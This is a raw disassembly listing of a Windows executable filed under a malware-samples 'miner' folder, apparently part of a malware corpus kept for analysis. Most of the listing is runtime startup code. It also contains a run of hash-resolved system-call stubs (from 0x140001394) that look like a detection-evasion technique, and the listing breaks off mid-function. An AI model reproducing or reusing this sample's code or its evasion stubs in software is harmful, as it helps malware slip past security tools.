
malware_samples/miner/fc21a103ecc58048bb6d431cbd4ba89f2c69f97f45ba2c1b0810d657f50c29b8.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	56                   	push   %rsi
   140001001:	48 83 ec 20          	sub    $0x20,%rsp
   140001005:	48 8b 05 1c 90 00 00 	mov    0x901c(%rip),%rax        # 0x14000a028
   14000100c:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001012:	48 8b 05 17 90 00 00 	mov    0x9017(%rip),%rax        # 0x14000a030
   140001019:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000101f:	48 8b 05 12 90 00 00 	mov    0x9012(%rip),%rax        # 0x14000a038
   140001026:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000102c:	48 8b 0d d5 8f 00 00 	mov    0x8fd5(%rip),%rcx        # 0x14000a008
   140001033:	0f b7 11             	movzwl (%rcx),%edx
   140001036:	31 c0                	xor    %eax,%eax
   140001038:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   14000103e:	75 4b                	jne    0x14000108b
   140001040:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140001044:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   14000104b:	75 3e                	jne    0x14000108b
   14000104d:	48 01 d1             	add    %rdx,%rcx
   140001050:	0f b7 51 18          	movzwl 0x18(%rcx),%edx
   140001054:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   14000105a:	74 17                	je     0x140001073
   14000105c:	81 fa 0b 01 00 00    	cmp    $0x10b,%edx
   140001062:	75 27                	jne    0x14000108b
   140001064:	83 79 74 0f          	cmpl   $0xf,0x74(%rcx)
   140001068:	72 21                	jb     0x14000108b
   14000106a:	48 81 c1 e8 00 00 00 	add    $0xe8,%rcx
   140001071:	eb 10                	jmp    0x140001083
   140001073:	83 b9 84 00 00 00 0f 	cmpl   $0xf,0x84(%rcx)
   14000107a:	72 0f                	jb     0x14000108b
   14000107c:	48 81 c1 f8 00 00 00 	add    $0xf8,%rcx
   140001083:	31 c0                	xor    %eax,%eax
   140001085:	83 39 00             	cmpl   $0x0,(%rcx)
   140001088:	0f 95 c0             	setne  %al
   14000108b:	48 8b 0d 8e 8f 00 00 	mov    0x8f8e(%rip),%rcx        # 0x14000a020
   140001092:	83 39 01             	cmpl   $0x1,(%rcx)
   140001095:	89 05 11 cd 28 00    	mov    %eax,0x28cd11(%rip)        # 0x14028ddac
   14000109b:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400010a0:	83 d9 00             	sbb    $0x0,%ecx
   1400010a3:	e8 98 8b 00 00       	call   0x140009c40
   1400010a8:	48 8b 05 d9 8f 00 00 	mov    0x8fd9(%rip),%rax        # 0x14000a088
   1400010af:	8b 30                	mov    (%rax),%esi
   1400010b1:	e8 0a 0f 00 00       	call   0x140001fc0
   1400010b6:	89 30                	mov    %esi,(%rax)
   1400010b8:	48 8b 05 b9 8f 00 00 	mov    0x8fb9(%rip),%rax        # 0x14000a078
   1400010bf:	8b 30                	mov    (%rax),%esi
   1400010c1:	e8 ea 0e 00 00       	call   0x140001fb0
   1400010c6:	89 30                	mov    %esi,(%rax)
   1400010c8:	e8 83 06 00 00       	call   0x140001750
   1400010cd:	48 8b 05 2c 8f 00 00 	mov    0x8f2c(%rip),%rax        # 0x14000a000
   1400010d4:	83 38 01             	cmpl   $0x1,(%rax)
   1400010d7:	75 0c                	jne    0x1400010e5
   1400010d9:	48 8d 0d 20 07 00 00 	lea    0x720(%rip),%rcx        # 0x140001800
   1400010e0:	e8 1b 0d 00 00       	call   0x140001e00
   1400010e5:	31 c0                	xor    %eax,%eax
   1400010e7:	48 83 c4 20          	add    $0x20,%rsp
   1400010eb:	5e                   	pop    %rsi
   1400010ec:	c3                   	ret
   1400010ed:	0f 1f 00             	nopl   (%rax)
   1400010f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400010f4:	48 8b 05 95 8f 00 00 	mov    0x8f95(%rip),%rax        # 0x14000a090
   1400010fb:	8b 00                	mov    (%rax),%eax
   1400010fd:	89 05 ad cc 28 00    	mov    %eax,0x28ccad(%rip)        # 0x14028ddb0
   140001103:	48 8d 05 a6 cc 28 00 	lea    0x28cca6(%rip),%rax        # 0x14028ddb0
   14000110a:	48 8b 0d 6f 8f 00 00 	mov    0x8f6f(%rip),%rcx        # 0x14000a080
   140001111:	44 8b 09             	mov    (%rcx),%r9d
   140001114:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001119:	48 8d 0d 94 cc 28 00 	lea    0x28cc94(%rip),%rcx        # 0x14028ddb4
   140001120:	48 8d 15 91 cc 28 00 	lea    0x28cc91(%rip),%rdx        # 0x14028ddb8
   140001127:	4c 8d 05 92 cc 28 00 	lea    0x28cc92(%rip),%r8        # 0x14028ddc0
   14000112e:	e8 fd 8a 00 00       	call   0x140009c30
   140001133:	90                   	nop
   140001134:	48 83 c4 28          	add    $0x28,%rsp
   140001138:	c3                   	ret
   140001139:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001140:	48 83 ec 28          	sub    $0x28,%rsp
   140001144:	48 8b 05 d5 8e 00 00 	mov    0x8ed5(%rip),%rax        # 0x14000a020
   14000114b:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001151:	e8 0a 00 00 00       	call   0x140001160
   140001156:	90                   	nop
   140001157:	90                   	nop
   140001158:	90                   	nop
   140001159:	48 83 c4 28          	add    $0x28,%rsp
   14000115d:	c3                   	ret
   14000115e:	66 90                	xchg   %ax,%ax
   140001160:	41 57                	push   %r15
   140001162:	41 56                	push   %r14
   140001164:	56                   	push   %rsi
   140001165:	57                   	push   %rdi
   140001166:	53                   	push   %rbx
   140001167:	48 83 ec 20          	sub    $0x20,%rsp
   14000116b:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001172:	00 00 
   140001174:	48 8b 78 08          	mov    0x8(%rax),%rdi
   140001178:	48 8b 35 c9 8e 00 00 	mov    0x8ec9(%rip),%rsi        # 0x14000a048
   14000117f:	31 c0                	xor    %eax,%eax
   140001181:	f0 48 0f b1 3e       	lock cmpxchg %rdi,(%rsi)
   140001186:	0f 94 c3             	sete   %bl
   140001189:	74 2e                	je     0x1400011b9
   14000118b:	48 39 c7             	cmp    %rax,%rdi
   14000118e:	74 29                	je     0x1400011b9
   140001190:	4c 8b 35 01 ab 00 00 	mov    0xab01(%rip),%r14        # 0x14000bc98
   140001197:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000119e:	00 00 
   1400011a0:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011a5:	41 ff d6             	call   *%r14
   1400011a8:	31 c0                	xor    %eax,%eax
   1400011aa:	f0 48 0f b1 3e       	lock cmpxchg %rdi,(%rsi)
   1400011af:	0f 94 c3             	sete   %bl
   1400011b2:	74 05                	je     0x1400011b9
   1400011b4:	48 39 c7             	cmp    %rax,%rdi
   1400011b7:	75 e7                	jne    0x1400011a0
   1400011b9:	48 8b 3d 90 8e 00 00 	mov    0x8e90(%rip),%rdi        # 0x14000a050
   1400011c0:	8b 07                	mov    (%rdi),%eax
   1400011c2:	83 f8 01             	cmp    $0x1,%eax
   1400011c5:	75 0c                	jne    0x1400011d3
   1400011c7:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   1400011cc:	e8 7f 8a 00 00       	call   0x140009c50
   1400011d1:	eb 27                	jmp    0x1400011fa
   1400011d3:	83 3f 00             	cmpl   $0x0,(%rdi)
   1400011d6:	74 09                	je     0x1400011e1
   1400011d8:	c6 05 e9 cb 28 00 01 	movb   $0x1,0x28cbe9(%rip)        # 0x14028ddc8
   1400011df:	eb 19                	jmp    0x1400011fa
   1400011e1:	c7 07 01 00 00 00    	movl   $0x1,(%rdi)
   1400011e7:	48 8b 0d 7a 8e 00 00 	mov    0x8e7a(%rip),%rcx        # 0x14000a068
   1400011ee:	48 8b 15 7b 8e 00 00 	mov    0x8e7b(%rip),%rdx        # 0x14000a070
   1400011f5:	e8 76 8a 00 00       	call   0x140009c70
   1400011fa:	8b 07                	mov    (%rdi),%eax
   1400011fc:	83 f8 01             	cmp    $0x1,%eax
   1400011ff:	75 19                	jne    0x14000121a
   140001201:	48 8b 0d 50 8e 00 00 	mov    0x8e50(%rip),%rcx        # 0x14000a058
   140001208:	48 8b 15 51 8e 00 00 	mov    0x8e51(%rip),%rdx        # 0x14000a060
   14000120f:	e8 5c 8a 00 00       	call   0x140009c70
   140001214:	c7 07 02 00 00 00    	movl   $0x2,(%rdi)
   14000121a:	84 db                	test   %bl,%bl
   14000121c:	74 05                	je     0x140001223
   14000121e:	31 c0                	xor    %eax,%eax
   140001220:	48 87 06             	xchg   %rax,(%rsi)
   140001223:	48 8b 05 e6 8d 00 00 	mov    0x8de6(%rip),%rax        # 0x14000a010
   14000122a:	48 8b 00             	mov    (%rax),%rax
   14000122d:	48 85 c0             	test   %rax,%rax
   140001230:	74 10                	je     0x140001242
   140001232:	31 c9                	xor    %ecx,%ecx
   140001234:	ba 02 00 00 00       	mov    $0x2,%edx
   140001239:	45 31 c0             	xor    %r8d,%r8d
   14000123c:	ff 15 c6 fd 28 00    	call   *0x28fdc6(%rip)        # 0x140291008
   140001242:	e8 39 06 00 00       	call   0x140001880
   140001247:	48 8d 0d c2 0b 00 00 	lea    0xbc2(%rip),%rcx        # 0x140001e10
   14000124e:	ff 15 3c aa 00 00    	call   *0xaa3c(%rip)        # 0x14000bc90
   140001254:	48 8b 0d e5 8d 00 00 	mov    0x8de5(%rip),%rcx        # 0x14000a040
   14000125b:	48 89 01             	mov    %rax,(%rcx)
   14000125e:	48 8d 0d 2b 01 00 00 	lea    0x12b(%rip),%rcx        # 0x140001390
   140001265:	e8 26 0d 00 00       	call   0x140001f90
   14000126a:	e8 01 06 00 00       	call   0x140001870
   14000126f:	48 63 3d 3e cb 28 00 	movslq 0x28cb3e(%rip),%rdi        # 0x14028ddb4
   140001276:	48 8d 0c fd 08 00 00 	lea    0x8(,%rdi,8),%rcx
   14000127d:	00 
   14000127e:	e8 1d 8a 00 00       	call   0x140009ca0
   140001283:	48 89 c6             	mov    %rax,%rsi
   140001286:	48 85 ff             	test   %rdi,%rdi
   140001289:	7e 47                	jle    0x1400012d2
   14000128b:	89 fb                	mov    %edi,%ebx
   14000128d:	4c 8b 35 24 cb 28 00 	mov    0x28cb24(%rip),%r14        # 0x14028ddb8
   140001294:	45 31 ff             	xor    %r15d,%r15d
   140001297:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000129e:	00 00 
   1400012a0:	4b 8b 0c fe          	mov    (%r14,%r15,8),%rcx
   1400012a4:	e8 17 8a 00 00       	call   0x140009cc0
   1400012a9:	48 8d 78 01          	lea    0x1(%rax),%rdi
   1400012ad:	48 89 f9             	mov    %rdi,%rcx
   1400012b0:	e8 eb 89 00 00       	call   0x140009ca0
   1400012b5:	4a 89 04 fe          	mov    %rax,(%rsi,%r15,8)
   1400012b9:	4b 8b 14 fe          	mov    (%r14,%r15,8),%rdx
   1400012bd:	48 89 c1             	mov    %rax,%rcx
   1400012c0:	49 89 f8             	mov    %rdi,%r8
   1400012c3:	e8 e8 89 00 00       	call   0x140009cb0
   1400012c8:	49 ff c7             	inc    %r15
   1400012cb:	4c 39 fb             	cmp    %r15,%rbx
   1400012ce:	75 d0                	jne    0x1400012a0
   1400012d0:	eb 02                	jmp    0x1400012d4
   1400012d2:	31 db                	xor    %ebx,%ebx
   1400012d4:	48 c7 04 de 00 00 00 	movq   $0x0,(%rsi,%rbx,8)
   1400012db:	00 
   1400012dc:	48 89 35 d5 ca 28 00 	mov    %rsi,0x28cad5(%rip)        # 0x14028ddb8
   1400012e3:	e8 d8 03 00 00       	call   0x1400016c0
   1400012e8:	48 8b 05 d1 ca 28 00 	mov    0x28cad1(%rip),%rax        # 0x14028ddc0
   1400012ef:	48 8b 0d 22 8d 00 00 	mov    0x8d22(%rip),%rcx        # 0x14000a018
   1400012f6:	48 8b 09             	mov    (%rcx),%rcx
   1400012f9:	48 89 01             	mov    %rax,(%rcx)
   1400012fc:	8b 0d b2 ca 28 00    	mov    0x28cab2(%rip),%ecx        # 0x14028ddb4
   140001302:	48 8b 15 af ca 28 00 	mov    0x28caaf(%rip),%rdx        # 0x14028ddb8
   140001309:	4c 8b 05 b0 ca 28 00 	mov    0x28cab0(%rip),%r8        # 0x14028ddc0
   140001310:	e8 4b 2a 00 00       	call   0x140003d60
   140001315:	89 05 b1 ca 28 00    	mov    %eax,0x28cab1(%rip)        # 0x14028ddcc
   14000131b:	83 3d 8a ca 28 00 00 	cmpl   $0x0,0x28ca8a(%rip)        # 0x14028ddac
   140001322:	74 20                	je     0x140001344
   140001324:	80 3d 9d ca 28 00 00 	cmpb   $0x0,0x28ca9d(%rip)        # 0x14028ddc8
   14000132b:	75 0b                	jne    0x140001338
   14000132d:	e8 2e 89 00 00       	call   0x140009c60
   140001332:	8b 05 94 ca 28 00    	mov    0x28ca94(%rip),%eax        # 0x14028ddcc
   140001338:	48 83 c4 20          	add    $0x20,%rsp
   14000133c:	5b                   	pop    %rbx
   14000133d:	5f                   	pop    %rdi
   14000133e:	5e                   	pop    %rsi
   14000133f:	41 5e                	pop    %r14
   140001341:	41 5f                	pop    %r15
   140001343:	c3                   	ret
   140001344:	89 c1                	mov    %eax,%ecx
   140001346:	e8 45 89 00 00       	call   0x140009c90
   14000134b:	cc                   	int3
   14000134c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001350:	48 83 ec 28          	sub    $0x28,%rsp
   140001354:	48 8b 05 c5 8c 00 00 	mov    0x8cc5(%rip),%rax        # 0x14000a020
   14000135b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001361:	e8 fa fd ff ff       	call   0x140001160
   140001366:	90                   	nop
   140001367:	90                   	nop
   140001368:	90                   	nop
   140001369:	48 83 c4 28          	add    $0x28,%rsp
   14000136d:	c3                   	ret
   14000136e:	66 90                	xchg   %ax,%ax
   140001370:	48 83 ec 28          	sub    $0x28,%rsp
   140001374:	e8 07 89 00 00       	call   0x140009c80
   140001379:	31 c9                	xor    %ecx,%ecx
   14000137b:	48 83 f8 01          	cmp    $0x1,%rax
   14000137f:	19 c9                	sbb    %ecx,%ecx
   140001381:	89 c8                	mov    %ecx,%eax
   140001383:	48 83 c4 28          	add    $0x28,%rsp
   140001387:	c3                   	ret
   140001388:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000138f:	00 
   140001390:	c3                   	ret
   140001391:	cc                   	int3
   140001392:	cc                   	int3
   140001393:	cc                   	int3
   140001394:	58                   	pop    %rax
   140001395:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000139a:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000139f:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400013a4:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400013a9:	48 83 ec 28          	sub    $0x28,%rsp
   1400013ad:	8b 0d 4d bc 00 00    	mov    0xbc4d(%rip),%ecx        # 0x14000d000
   1400013b3:	e8 08 84 00 00       	call   0x1400097c0
   1400013b8:	89 05 4e bc 00 00    	mov    %eax,0xbc4e(%rip)        # 0x14000d00c
   1400013be:	48 31 c9             	xor    %rcx,%rcx
   1400013c1:	e8 aa 86 00 00       	call   0x140009a70
   1400013c6:	48 89 05 43 bc 00 00 	mov    %rax,0xbc43(%rip)        # 0x14000d010
   1400013cd:	48 31 c0             	xor    %rax,%rax
   1400013d0:	8b 05 36 bc 00 00    	mov    0xbc36(%rip),%eax        # 0x14000d00c
   1400013d6:	48 83 c4 28          	add    $0x28,%rsp
   1400013da:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   1400013df:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   1400013e4:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   1400013e9:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   1400013ee:	49 89 ca             	mov    %rcx,%r10
   1400013f1:	8f 05 0d bc 00 00    	pop    0xbc0d(%rip)        # 0x14000d004
   1400013f7:	ff 15 13 bc 00 00    	call   *0xbc13(%rip)        # 0x14000d010
   1400013fd:	ff 35 01 bc 00 00    	push   0xbc01(%rip)        # 0x14000d004
   140001403:	c3                   	ret
   140001404:	c7 05 f2 bb 00 00 68 	movl   $0xec455d68,0xbbf2(%rip)        # 0x14000d000
   14000140b:	5d 45 ec 
   14000140e:	e8 81 ff ff ff       	call   0x140001394
   140001413:	c7 05 e3 bb 00 00 7b 	movl   $0xd0a4dd7b,0xbbe3(%rip)        # 0x14000d000
   14000141a:	dd a4 d0 
   14000141d:	e8 72 ff ff ff       	call   0x140001394
   140001422:	c7 05 d4 bb 00 00 77 	movl   $0x6d9b4077,0xbbd4(%rip)        # 0x14000d000
   140001429:	40 9b 6d 
   14000142c:	e8 63 ff ff ff       	call   0x140001394
   140001431:	c7 05 c5 bb 00 00 df 	movl   $0xd29941df,0xbbc5(%rip)        # 0x14000d000
   140001438:	41 99 d2 
   14000143b:	e8 54 ff ff ff       	call   0x140001394
   140001440:	c7 05 b6 bb 00 00 0c 	movl   $0xcf360f0c,0xbbb6(%rip)        # 0x14000d000
   140001447:	0f 36 cf 
   14000144a:	e8 45 ff ff ff       	call   0x140001394
   14000144f:	c7 05 a7 bb 00 00 e6 	movl   $0x86635ee6,0xbba7(%rip)        # 0x14000d000
   140001456:	5e 63 86 
   140001459:	e8 36 ff ff ff       	call   0x140001394
   14000145e:	c7 05 98 bb 00 00 8e 	movl   $0xa7d5578e,0xbb98(%rip)        # 0x14000d000
   140001465:	57 d5 a7 
   140001468:	e8 27 ff ff ff       	call   0x140001394
   14000146d:	c7 05 89 bb 00 00 5d 	movl   $0x7075ff5d,0xbb89(%rip)        # 0x14000d000
   140001474:	ff 75 70 
   140001477:	e8 18 ff ff ff       	call   0x140001394
   14000147c:	c7 05 7a bb 00 00 21 	movl   $0xebcfa221,0xbb7a(%rip)        # 0x14000d000
   140001483:	a2 cf eb 
   140001486:	e8 09 ff ff ff       	call   0x140001394
   14000148b:	c7 05 6b bb 00 00 d1 	movl   $0xfcab1cd1,0xbb6b(%rip)        # 0x14000d000
   140001492:	1c ab fc 
   140001495:	e8 fa fe ff ff       	call   0x140001394
   14000149a:	c7 05 5c bb 00 00 2b 	movl   $0x5f3ca52b,0xbb5c(%rip)        # 0x14000d000
   1400014a1:	a5 3c 5f 
   1400014a4:	e8 eb fe ff ff       	call   0x140001394
   1400014a9:	c7 05 4d bb 00 00 93 	movl   $0xb8d9d93,0xbb4d(%rip)        # 0x14000d000
   1400014b0:	9d 8d 0b 
   1400014b3:	e8 dc fe ff ff       	call   0x140001394
   1400014b8:	c7 05 3e bb 00 00 af 	movl   $0xf33378af,0xbb3e(%rip)        # 0x14000d000
   1400014bf:	78 33 f3 
   1400014c2:	e8 cd fe ff ff       	call   0x140001394
   1400014c7:	c7 05 2f bb 00 00 93 	movl   $0xc0f75293,0xbb2f(%rip)        # 0x14000d000
   1400014ce:	52 f7 c0 
   1400014d1:	e8 be fe ff ff       	call   0x140001394
   1400014d6:	c7 05 20 bb 00 00 46 	movl   $0x802b8446,0xbb20(%rip)        # 0x14000d000
   1400014dd:	84 2b 80 
   1400014e0:	e8 af fe ff ff       	call   0x140001394
   1400014e5:	c7 05 11 bb 00 00 6a 	movl   $0x49e1906a,0xbb11(%rip)        # 0x14000d000
   1400014ec:	90 e1 49 
   1400014ef:	e8 a0 fe ff ff       	call   0x140001394
   1400014f4:	c7 05 02 bb 00 00 a9 	movl   $0xb628a9a9,0xbb02(%rip)        # 0x14000d000
   1400014fb:	a9 28 b6 
   1400014fe:	e8 91 fe ff ff       	call   0x140001394
   140001503:	c7 05 f3 ba 00 00 1d 	movl   $0x11f1901d,0xbaf3(%rip)        # 0x14000d000
   14000150a:	90 f1 11 
   14000150d:	e8 82 fe ff ff       	call   0x140001394
   140001512:	c7 05 e4 ba 00 00 ae 	movl   $0xd5d83dae,0xbae4(%rip)        # 0x14000d000
   140001519:	3d d8 d5 
   14000151c:	e8 73 fe ff ff       	call   0x140001394
   140001521:	c7 05 d5 ba 00 00 de 	movl   $0x6af503de,0xbad5(%rip)        # 0x14000d000
   140001528:	03 f5 6a 
   14000152b:	e8 64 fe ff ff       	call   0x140001394
   140001530:	c7 05 c6 ba 00 00 cb 	movl   $0xe2d458cb,0xbac6(%rip)        # 0x14000d000
   140001537:	58 d4 e2 
   14000153a:	e8 55 fe ff ff       	call   0x140001394
   14000153f:	c7 05 b7 ba 00 00 bc 	movl   $0xefb20bbc,0xbab7(%rip)        # 0x14000d000
   140001546:	0b b2 ef 
   140001549:	e8 46 fe ff ff       	call   0x140001394
   14000154e:	c7 05 a8 ba 00 00 3f 	movl   $0x62a7173f,0xbaa8(%rip)        # 0x14000d000
   140001555:	17 a7 62 
   140001558:	e8 37 fe ff ff       	call   0x140001394
   14000155d:	c7 05 99 ba 00 00 15 	movl   $0xe1a97015,0xba99(%rip)        # 0x14000d000
   140001564:	70 a9 e1 
   140001567:	e8 28 fe ff ff       	call   0x140001394
   14000156c:	c7 05 8a ba 00 00 8a 	movl   $0xa2bf398a,0xba8a(%rip)        # 0x14000d000
   140001573:	39 bf a2 
   140001576:	e8 19 fe ff ff       	call   0x140001394
   14000157b:	c7 05 7b ba 00 00 bc 	movl   $0xe6aa07bc,0xba7b(%rip)        # 0x14000d000
   140001582:	07 aa e6 
   140001585:	e8 0a fe ff ff       	call   0x140001394
   14000158a:	c7 05 6c ba 00 00 38 	movl   $0x684da538,0xba6c(%rip)        # 0x14000d000
   140001591:	a5 4d 68 
   140001594:	e8 fb fd ff ff       	call   0x140001394
   140001599:	c7 05 5d ba 00 00 bc 	movl   $0xc4db5bbc,0xba5d(%rip)        # 0x14000d000
   1400015a0:	5b db c4 
   1400015a3:	e8 ec fd ff ff       	call   0x140001394
   1400015a8:	c7 05 4e ba 00 00 9c 	movl   $0x8a3ad49c,0xba4e(%rip)        # 0x14000d000
   1400015af:	d4 3a 8a 
   1400015b2:	e8 dd fd ff ff       	call   0x140001394
   1400015b7:	c7 05 3f ba 00 00 b4 	movl   $0xfc61a1b4,0xba3f(%rip)        # 0x14000d000
   1400015be:	a1 61 fc 
   1400015c1:	e8 ce fd ff ff       	call   0x140001394
   1400015c6:	c7 05 30 ba 00 00 75 	movl   $0x130dfe75,0xba30(%rip)        # 0x14000d000
   1400015cd:	fe 0d 13 
   1400015d0:	e8 bf fd ff ff       	call   0x140001394
   1400015d5:	c7 05 21 ba 00 00 e4 	movl   $0x4c027e4,0xba21(%rip)        # 0x14000d000
   1400015dc:	27 c0 04 
   1400015df:	e8 b0 fd ff ff       	call   0x140001394
   1400015e4:	c7 05 12 ba 00 00 28 	movl   $0xc9d4bc28,0xba12(%rip)        # 0x14000d000
   1400015eb:	bc d4 c9 
   1400015ee:	e8 a1 fd ff ff       	call   0x140001394
   1400015f3:	cc                   	int3
   1400015f4:	cc                   	int3
   1400015f5:	cc                   	int3
   1400015f6:	cc                   	int3
   1400015f7:	cc                   	int3
   1400015f8:	cc                   	int3
   1400015f9:	cc                   	int3
   1400015fa:	cc                   	int3
   1400015fb:	cc                   	int3
   1400015fc:	cc                   	int3
   1400015fd:	cc                   	int3
   1400015fe:	cc                   	int3
   1400015ff:	cc                   	int3
   140001600:	48 83 ec 28          	sub    $0x28,%rsp
   140001604:	48 8b 05 0d ba 00 00 	mov    0xba0d(%rip),%rax        # 0x14000d018
   14000160b:	48 8b 00             	mov    (%rax),%rax
   14000160e:	48 85 c0             	test   %rax,%rax
   140001611:	74 2e                	je     0x140001641
   140001613:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000161a:	84 00 00 00 00 00 
   140001620:	ff 15 e2 f9 28 00    	call   *0x28f9e2(%rip)        # 0x140291008
   140001626:	48 8b 05 eb b9 00 00 	mov    0xb9eb(%rip),%rax        # 0x14000d018
   14000162d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001631:	48 89 0d e0 b9 00 00 	mov    %rcx,0xb9e0(%rip)        # 0x14000d018
   140001638:	48 8b 40 08          	mov    0x8(%rax),%rax
   14000163c:	48 85 c0             	test   %rax,%rax
   14000163f:	75 df                	jne    0x140001620
   140001641:	48 83 c4 28          	add    $0x28,%rsp
   140001645:	c3                   	ret
   140001646:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000164d:	00 00 00 
   140001650:	56                   	push   %rsi
   140001651:	57                   	push   %rdi
   140001652:	53                   	push   %rbx
   140001653:	48 83 ec 20          	sub    $0x20,%rsp
   140001657:	48 8b 35 3a 8a 00 00 	mov    0x8a3a(%rip),%rsi        # 0x14000a098
   14000165e:	8b 06                	mov    (%rsi),%eax
   140001660:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001663:	75 17                	jne    0x14000167c
   140001665:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000166a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001670:	8d 48 02             	lea    0x2(%rax),%ecx
   140001673:	ff c0                	inc    %eax
   140001675:	48 83 3c ce 00       	cmpq   $0x0,(%rsi,%rcx,8)
   14000167a:	75 f4                	jne    0x140001670
   14000167c:	85 c0                	test   %eax,%eax
   14000167e:	74 25                	je     0x1400016a5
   140001680:	89 c7                	mov    %eax,%edi
   140001682:	48 ff cf             	dec    %rdi
   140001685:	48 89 fb             	mov    %rdi,%rbx
   140001688:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000168f:	00 
   140001690:	48 8b 44 fe 08       	mov    0x8(%rsi,%rdi,8),%rax
   140001695:	ff 15 6d f9 28 00    	call   *0x28f96d(%rip)        # 0x140291008
   14000169b:	48 ff cb             	dec    %rbx
   14000169e:	85 ff                	test   %edi,%edi
   1400016a0:	48 89 df             	mov    %rbx,%rdi
   1400016a3:	75 eb                	jne    0x140001690
   1400016a5:	48 8d 0d 54 ff ff ff 	lea    -0xac(%rip),%rcx        # 0x140001600
   1400016ac:	48 83 c4 20          	add    $0x20,%rsp
   1400016b0:	5b                   	pop    %rbx
   1400016b1:	5f                   	pop    %rdi
   1400016b2:	5e                   	pop    %rsi
   1400016b3:	e9 b8 fc ff ff       	jmp    0x140001370
   1400016b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400016bf:	00 
   1400016c0:	56                   	push   %rsi
   1400016c1:	57                   	push   %rdi
   1400016c2:	53                   	push   %rbx
   1400016c3:	48 83 ec 20          	sub    $0x20,%rsp
   1400016c7:	80 3d 02 c7 28 00 00 	cmpb   $0x0,0x28c702(%rip)        # 0x14028ddd0
   1400016ce:	74 08                	je     0x1400016d8
   1400016d0:	48 83 c4 20          	add    $0x20,%rsp
   1400016d4:	5b                   	pop    %rbx
   1400016d5:	5f                   	pop    %rdi
   1400016d6:	5e                   	pop    %rsi
   1400016d7:	c3                   	ret
   1400016d8:	c6 05 f1 c6 28 00 01 	movb   $0x1,0x28c6f1(%rip)        # 0x14028ddd0
   1400016df:	48 8b 35 b2 89 00 00 	mov    0x89b2(%rip),%rsi        # 0x14000a098
   1400016e6:	8b 06                	mov    (%rsi),%eax
   1400016e8:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400016eb:	75 1f                	jne    0x14000170c
   1400016ed:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400016f2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400016f9:	1f 84 00 00 00 00 00 
   140001700:	8d 48 02             	lea    0x2(%rax),%ecx
   140001703:	ff c0                	inc    %eax
   140001705:	48 83 3c ce 00       	cmpq   $0x0,(%rsi,%rcx,8)
   14000170a:	75 f4                	jne    0x140001700
   14000170c:	85 c0                	test   %eax,%eax
   14000170e:	74 25                	je     0x140001735
   140001710:	89 c7                	mov    %eax,%edi
   140001712:	48 ff cf             	dec    %rdi
   140001715:	48 89 fb             	mov    %rdi,%rbx
   140001718:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000171f:	00 
   140001720:	48 8b 44 fe 08       	mov    0x8(%rsi,%rdi,8),%rax
   140001725:	ff 15 dd f8 28 00    	call   *0x28f8dd(%rip)        # 0x140291008
   14000172b:	48 ff cb             	dec    %rbx
   14000172e:	85 ff                	test   %edi,%edi
   140001730:	48 89 df             	mov    %rbx,%rdi
   140001733:	75 eb                	jne    0x140001720
   140001735:	48 8d 0d c4 fe ff ff 	lea    -0x13c(%rip),%rcx        # 0x140001600
   14000173c:	48 83 c4 20          	add    $0x20,%rsp
   140001740:	5b                   	pop    %rbx
   140001741:	5f                   	pop    %rdi
   140001742:	5e                   	pop    %rsi
   140001743:	e9 28 fc ff ff       	jmp    0x140001370
   140001748:	cc                   	int3
   140001749:	cc                   	int3
   14000174a:	cc                   	int3
   14000174b:	cc                   	int3
   14000174c:	cc                   	int3
   14000174d:	cc                   	int3
   14000174e:	cc                   	int3
   14000174f:	cc                   	int3
   140001750:	31 c0                	xor    %eax,%eax
   140001752:	c3                   	ret
   140001753:	cc                   	int3
   140001754:	cc                   	int3
   140001755:	cc                   	int3
   140001756:	cc                   	int3
   140001757:	cc                   	int3
   140001758:	cc                   	int3
   140001759:	cc                   	int3
   14000175a:	cc                   	int3
   14000175b:	cc                   	int3
   14000175c:	cc                   	int3
   14000175d:	cc                   	int3
   14000175e:	cc                   	int3
   14000175f:	cc                   	int3
   140001760:	56                   	push   %rsi
   140001761:	57                   	push   %rdi
